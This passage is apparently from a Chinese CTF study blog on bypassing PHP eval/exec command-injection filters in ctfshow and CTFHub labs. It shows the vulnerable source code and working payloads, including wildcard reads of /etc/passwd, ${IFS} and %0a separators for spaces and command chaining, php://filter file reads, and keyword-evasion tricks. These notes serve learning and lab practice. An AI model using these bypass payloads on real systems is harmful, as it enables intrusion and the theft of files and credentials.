<p>使用了？通配符之后，他就可能有很多种变化，比如这两种，而这些亲测都是<strong>可以使用</strong>的</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /?tc/?<span class="keyword">as</span>?wd</span><br><span class="line">cat <span class="comment">/*tc/*as*wd</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里需要注意的也是一样，不要局限自己的思维，几种通配符也是可以搭配使用的</p>
<p>ctf show 29,30都可以通过通配符绕过</p>
<p>于是我们来看 31关，主要是这关用了根本没想到的骚操作</p>
<p>源代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们首先通过通配符绕过</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;tac\$&#123;IFS&#125;?lag?ph?&quot;</span>);</span><br><span class="line"><span class="comment">//我们使用了$&#123;IFS&#125;代替空格，要注意的是在url中$属于特殊字符，需要在进行转义</span></span><br><span class="line"><span class="comment">//然后就是用?匹配字符命令执行</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们也可以跳板：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">//url中通过&amp;来分隔两个GET传参 我们把c中写入未过滤的代码 1中</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="2-关键符过滤"><a href="#2-关键符过滤" class="headerlink" title="2.关键符过滤"></a>2.关键符过滤</h3><p>ctf show 32关中过滤掉了绝大部分符号</p>
<p>源代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意正则表达式换行的时候把空格盖住了，空gei</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>过滤掉了括号和反引号，目前我就没办法使用系统命令执行，于是看了题解</p>
<p>之前我们使用include都是include($file)，于是我们重新了解一下</p>
<p>include语法：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="string">&#x27;$file&#x27;</span>; 和 <span class="keyword">include</span>(<span class="variable">$file</span>); 都是可以执行的</span><br><span class="line"><span class="comment">//于是记录一下不需要使用括号的函数</span></span><br><span class="line"><span class="comment">//echo print isset unset include require</span></span><br><span class="line">题解中 <span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]也可以 </span><br><span class="line"><span class="comment">//%0a是回车键的url编码 估计是有什么神秘力量，include后面加空格怎么说都不行，估计是绕不过验证</span></span><br><span class="line"><span class="comment">//为什么空格用%20也绕不过验证</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是根据include特性，只需传入：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="string">&quot;<span class="subst">$_GET</span>[1]&quot;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="3-综合过滤练习"><a href="#3-综合过滤练习" class="headerlink" title="3.综合过滤练习"></a>3.综合过滤练习</h3><p>我好像没写过多条命令一起执行的题目，于是他就来了</p>
<p><strong>ctf hub 综合过滤练习</strong></p>
<p>源代码：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>和以前不同的是准备好了命令执行函数 ，和需要多条命令执行，命令拼接符终于用到了，但知道的全部给谁过滤掉了</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接符被过滤掉了，我们还剩%0a可以作为拼接符</span></span><br><span class="line"><span class="comment">//空格使用$&#123;IFS&#125;替代</span></span><br><span class="line"><span class="comment">//cat他函数即可</span></span><br><span class="line"><span class="comment">//关键词用通配符</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>直接上答案：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>als</span><br><span class="line"><span class="comment">//查看当前目录 发现在文件夹flag_is_here中</span></span><br><span class="line">ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>acd$&#123;IFS&#125;fla?_is_here%<span class="number">0</span>als</span><br><span class="line"><span class="comment">//查看文件夹 目录</span></span><br><span class="line"><span class="comment">//有点奇怪 之前好像有这么一个说法 $属于url特殊字符 需要转义不然没用，但为什么这个题目用了转义还错了</span></span><br><span class="line">ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>acd$&#123;IFS&#125;fla?_is_here%<span class="number">0</span>atac$&#123;IFS&#125;flag_168933341887.php</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="4-空格绕过"><a href="#4-空格绕过" class="headerlink" title="4.空格绕过"></a>4.空格绕过</h3><p>虽然内容挺少的，但还是要记一下</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linux内置分隔符：$&#123;IFS&#125;，<span class="variable">$IFS</span>，$IFS$<span class="number">9</span> 可作为空格代替</span><br><span class="line"><span class="comment">//不知道为什么$IFS有时用不起</span></span><br><span class="line">利用重定向符&lt;&gt;</span><br><span class="line"><span class="comment">//我们有时候也可以使用其他符号代替空格</span></span><br><span class="line"><span class="comment">//比如我们有时使用回车和tab也可以达到效果我们通过url编码即可</span></span><br><span class="line"><span class="comment">//回车：%0a tab:%09</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="5-关键词绕过"><a href="#5-关键词绕过" class="headerlink" title="5.关键词绕过"></a>5.关键词绕过</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过拆分命令达到绕过的效果：a=l;b=s;$a<span class="variable">$b</span><span class="comment">//话说为什么不需要$a=l</span></span><br><span class="line"><span class="comment">//问了一下ai好像有点思路AI:在 Linux 的 shell （如 Bash）中，这是一个变量赋值语句。它将字符 l 赋值给变量 a。在 shell 里，变量赋值时等号两边不能有空格，格式为 变量名=值。</span></span><br><span class="line">空变量绕过：cat fl$&#123;x&#125;ag cat tes$(z)t/flag</span><br><span class="line">控制环境变量绕过：</span><br><span class="line">先利用<span class="keyword">echo</span> <span class="variable">$PATH</span>得到环境变量 =&gt; <span class="string">&quot;/usr/local/….blablabla”</span></span><br><span class="line"><span class="string">接着利用echo $&#123;#PATH&#125;得到长度</span></span><br><span class="line"><span class="string">然后要哪个字符截取哪个字符就行</span></span><br><span class="line"><span class="string">$&#123;PATH:0:1&#125; =&gt; ‘/’</span></span><br><span class="line"><span class="string">$&#123;PATH:1:1&#125; =&gt; ‘u’</span></span><br><span class="line"><span class="string">$&#123;PATH:0:4&#125; =&gt; ‘/usr’</span></span><br><span class="line"><span class="string">空值绕过：cat fl&quot;</span><span class="string">&quot;ag cat fl&#x27;&#x27;ag cat &quot;</span>fl<span class="string">&quot;&quot;</span>ag<span class="string">&quot;//经过测试 确实有用</span></span><br><span class="line"><span class="string">反斜杠绕过：ca\t flag l\s//也挺好用的</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="6-空变量"><a href="#6-空变量" class="headerlink" title="6.空变量"></a>6.空变量</h3><p>之前提到了空变量，但不怎么懂</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$*和$@，<span class="variable">$x</span>(x 代表 <span class="number">1</span>-<span class="number">9</span>)，$&#123;x&#125;(x&gt;=<span class="number">10</span>)：比如ca$&#123;<span class="number">21</span>&#125;t a.txt表示cat a.txt</span><br><span class="line">在没有传入参数的情况下，这些特殊字符默认为空，如下:</span><br><span class="line"></span><br><span class="line">wh$<span class="number">1</span>oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="7-目录跨越"><a href="#7-目录跨越" class="headerlink" title="7.目录跨越"></a>7.目录跨越</h3><p>当我们的路径符<code>/</code>被过滤掉了的时候，我们还有一招就是通过cd命令进行目录穿越</p>
<div class="code-container" code-lang="Bash"><div class="codebox"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..&amp;&amp;<span class="built_in">cd</span> ..&amp;&amp;<span class="built_in">cd</span> ..&amp;&amp;<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里面的<code>&amp;&amp;</code>是用来分隔命令的</p>
<h2 id="4-无参RCE"><a href="#4-无参RCE" class="headerlink" title="4.无参RCE"></a>4.无参RCE</h2><p>我们先来看ctfshow40关：</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" 